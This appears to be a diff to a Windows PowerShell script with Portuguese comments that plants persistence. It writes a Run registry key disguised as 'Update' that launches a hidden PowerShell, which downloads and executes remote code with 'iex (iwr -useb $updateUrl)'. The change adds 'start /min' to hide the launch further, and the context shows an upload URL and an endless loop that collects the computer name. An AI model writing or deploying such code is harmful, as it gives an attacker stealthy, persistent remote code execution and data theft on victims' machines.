@@ -22,7 +22,7 @@ $uploadUrl = "$siteUrl/upload.php"
 
 # Verifica se a versão do Windows é maior que 10
 if ([version]$windowsVersion -gt [version]"10.0") {
-    reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "Update" /t REG_EXPAND_SZ /d "%windir%\system32\cmd.exe /c powershell -win 1 iex (iwr -useb $updateUrl)" /f
+    reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "Update" /t REG_EXPAND_SZ /d "%windir%\system32\cmd.exe /c start /min powershell -win 1 iex (iwr -useb $updateUrl)" /f
 
     while ($true) {
         $nomePC = $env:COMPUTERNAME
